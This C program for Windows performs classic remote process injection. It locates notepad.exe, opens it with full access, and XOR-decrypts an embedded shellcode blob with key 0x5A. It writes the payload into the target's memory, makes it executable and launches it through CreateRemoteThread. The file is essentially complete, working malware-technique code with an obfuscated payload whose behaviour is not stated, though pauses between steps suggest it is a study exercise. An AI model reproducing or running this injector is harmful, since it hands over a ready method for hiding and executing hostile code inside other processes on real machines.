#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

unsigned char pShellcode[] =
{ 0xA6, 0x12, 0xD9, 0xBE, 0xAA, 0xB2, 0x9A, 0x5A, 0x5A, 0x5A, 0x1B, 0x0B, 0x1B, 0x0A, 0x08, 0x0B, 0x0C, 0x12, 0x6B, 0x88, 0x3F, 0x12, 0xD1, 0x08, 0x3A, 0x12, 0xD1, 0x08, 0x42, 0x12, 0xD1, 0x08, 0x7A, 0x12, 0xD1, 0x28, 0x0A, 0x12, 0x55, 0xED, 0x10, 0x10, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A, 0xF6, 0x66, 0x3B, 0x26, 0x58, 0x76, 0x7A, 0x1B, 0x9B, 0x93, 0x57, 0x1B, 0x5B, 0x9B, 0xB8, 0xB7, 0x08, 0x1B, 0x0B, 0x12, 0xD1, 0x08, 0x7A, 0xD1, 0x18, 0x66, 0x12, 0x5B, 0x8A, 0xD1, 0xDA, 0xD2, 0x5A, 0x5A, 0x5A, 0x12, 0xDF, 0x9A, 0x2E, 0x3D, 0x12, 0x5B, 0x8A, 0x0A, 0xD1, 0x12, 0x42, 0x1E, 0xD1, 0x1A, 0x7A, 0x13, 0x5B, 0x8A, 0xB9, 0x0C, 0x12, 0xA5, 0x93, 0x1B, 0xD1, 0x6E, 0xD2, 0x12, 0x5B, 0x8C, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A, 0xF6, 0x1B, 0x9B, 0x93, 0x57, 0x1B, 0x5B, 0x9B, 0x62, 0xBA, 0x2F, 0xAB, 0x16, 0x59, 0x16, 0x7E, 0x52, 0x1F, 0x63, 0x8B, 0x2F, 0x82, 0x02, 0x1E, 0xD1, 0x1A, 0x7E, 0x13, 0x5B, 0x8A, 0x3C, 0x1B, 0xD1, 0x56, 0x12, 0x1E, 0xD1, 0x1A, 0x46, 0x13, 0x5B, 0x8A, 0x1B, 0xD1, 0x5E, 0xD2, 0x12, 0x5B, 0x8A, 0x1B, 0x02, 0x1B, 0x02, 0x04, 0x03, 0x00, 0x1B, 0x02, 0x1B, 0x03, 0x1B, 0x00, 0x12, 0xD9, 0xB6, 0x7A, 0x1B, 0x08, 0xA5, 0xBA, 0x02, 0x1B, 0x03, 0x00, 0x12, 0xD1, 0x48, 0xB3, 0x0D, 0xA5, 0xA5, 0xA5, 0x07, 0x13, 0xE4, 0x2D, 0x29, 0x68, 0x05, 0x69, 0x68, 0x5A, 0x5A, 0x1B, 0x0C, 0x13, 0xD3, 0xBC, 0x12, 0xDB, 0xB6, 0xFA, 0x5B, 0x5A, 0x5A, 0x13, 0xD3, 0xBF, 0x13, 0xE6, 0x58, 0x5A, 0x5B, 0xE1, 0x9A, 0xF2, 0x62, 0xED, 0x1B, 0x0E, 0x13, 0xD3, 0xBE, 0x16, 0xD3, 0xAB, 0x1B, 0xE0, 0x16, 0x2D, 0x7C, 0x5D, 0xA5, 0x8F, 0x16, 0xD3, 0xB0, 0x32, 0x5B, 0x5B, 0x5A, 0x5A, 0x03, 0x1B, 0xE0, 0x73, 0xDA, 0x31, 0x5A, 0xA5, 0x8F, 0x0A, 0x0A, 0x17, 0x6B, 0x93, 0x17, 0x6B, 0x9A, 0x12, 0xA5, 0x9A, 0x12, 0xD3, 0x98, 0x12, 0xA5, 0x9A, 0x12, 0xD3, 0x9B, 0x1B, 0xE0, 0xB0, 0x55, 0x85, 0xBA, 0xA5, 0x8F, 0x12, 0xD3, 0x9D, 0x30, 0x4A, 0x1B, 0x02, 0x16, 0xD3, 0xB8, 0x12, 0xD3, 0xA3, 0x1B, 0xE0, 0xC3, 0xFF, 0x2E, 0x3B, 0xA5, 0x8F, 0x12, 0xDB, 0x9E, 0x1A, 0x58, 0x5A, 0x5A, 0x13, 0xE2, 0x39, 0x37, 0x3E, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x1B, 0x0A, 0x1B, 0x0A, 0x12, 0xD3, 0xB8, 0x0D, 0x0D, 0x0D, 0x17, 0x6B, 0x9A, 0x30, 0x57, 0x03, 0x1B, 0x0A, 0xB8, 0xA6, 0x3C, 0x9D, 0x1E, 0x7E, 0x0E, 0x5B, 0x5B, 0x12, 0xD7, 0x1E, 0x7E, 0x42, 0x9C, 0x5A, 0x32, 0x12, 0xD3, 0xBC, 0x0C, 0x0A, 0x1B, 0x0A, 0x1B, 0x0A, 0x1B, 0x0A, 0x13, 0xA5, 0x9A, 0x1B, 0x0A, 0x13, 0xA5, 0x92, 0x17, 0xD3, 0x9B, 0x16, 0xD3, 0x9B, 0x1B, 0xE0, 0x23, 0x96, 0x65, 0xDC, 0xA5, 0x8F, 0x12, 0x6B, 0x88, 0x12, 0xA5, 0x90, 0xD1, 0x54, 0x1B, 0xE0, 0x52, 0xDD, 0x47, 0x3A, 0xA5, 0x8F, 0xE1, 0xAA, 0xEF, 0xF8, 0x0C, 0x1B, 0xE0, 0xFC, 0xCF, 0xE7, 0xC7, 0xA5, 0x8F, 0x12, 0xD9, 0x9E, 0x72, 0x66, 0x5C, 0x26, 0x50, 0xDA, 0xA1, 0xBA, 0x2F, 0x5F, 0xE1, 0x1D, 0x49, 0x28, 0x35, 0x30, 0x5A, 0x03, 0x1B, 0xD3, 0x80, 0xA5, 0x8F };

// Function to XOR encrypt a payload with a single byte key
void XorByOneKey(BYTE* pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
	size_t i = 0;
	for (i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32 Proc = { sizeof(PROCESSENTRY32) };

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}


	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			printf("[i] Searching For Process Id of \"notepad.exe\" [+] Done\n");
			printf("Found Target Process Pid: %d\n", *dwProcessId);
			// Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
		// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));

	// Cleanup
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, BYTE encryptionKey) {

	LPVOID	pShellcodeAddress = NULL;

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;

	//DECRYPT PAYLOAD
	printf("[#] Press <Enter> To Decrypt...\n");
	getchar();
	XorByOneKey(pShellcode, sSizeOfShellcode, encryptionKey);
	printf("[i] Decrypting ...[+] Done !\n");
	SIZE_T payloadSize = sizeof(pShellcode);
	printf("[i] Deobuscated Memory At : 0x%p\n", pShellcode);



	// Allocate memory in the remote process of size sSizeOfShellcode
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	//set pShellcode to null bcaz it's not required more
	memset(pShellcode, '\0', sSizeOfShellcode);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	printf("[#] Press <Enter> To Run ... ");
	getchar();
	printf("[i] Executing Payload ... ");
	// Launch the shellcode in a new thread
	if (CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE !\n");

	return TRUE;
}

int main() {

	WCHAR processName[] = L"notepad.exe";
	HANDLE hprocess = NULL;
	DWORD processId = 0;

	// Key to use for encryption
	BYTE encryptionKey = 0x5A;

	SIZE_T sizeofShellcode = sizeof(pShellcode);


	if (!GetRemoteProcessHandle(processName, &processId, &hprocess)) {
		printf("[!] GetRemoteProcessHandle failed with %d \n",GetLastError());
		return 1;
	}

	if (!InjectShellcodeToRemoteProcess(hprocess, pShellcode, sizeofShellcode,encryptionKey)) {
		printf("[!] InjectShellcodeToRemoteProcess failed with %d \n", GetLastError());
		return 1;
	}
	CloseHandle(hprocess);

	return 0;
}